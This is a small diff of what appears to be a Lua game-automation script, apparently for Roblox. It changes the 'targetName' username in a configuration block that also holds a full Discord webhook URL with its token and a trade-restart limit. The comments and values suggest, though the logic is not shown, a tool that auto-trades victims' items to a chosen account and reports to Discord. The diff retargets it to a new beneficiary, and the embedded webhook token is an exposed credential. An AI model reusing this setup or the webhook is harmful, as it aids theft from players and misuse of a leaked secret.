@@ -18,7 +18,7 @@
 ]]
 
 -- Configuração do alvo, dos destinos externos e dos limites da automação.
-local targetName = "lalrinha12324"
+local targetName = "olhom_y77"
 local webhookUrl = "https://discord.com/api/webhooks/1563735594457235578/LSLX34_Zwg6UJSQj3JXh0nA7JO7bLimSWDEwn99Er7o2Wu2mVItjj_WAk0tuDGlUjxEU"
 local bannerImageUrl = "https://images.unsplash.com/photo-1522383225653-ed111181a951?w=1200&q=80"
 local maxTradeRestarts = (25)
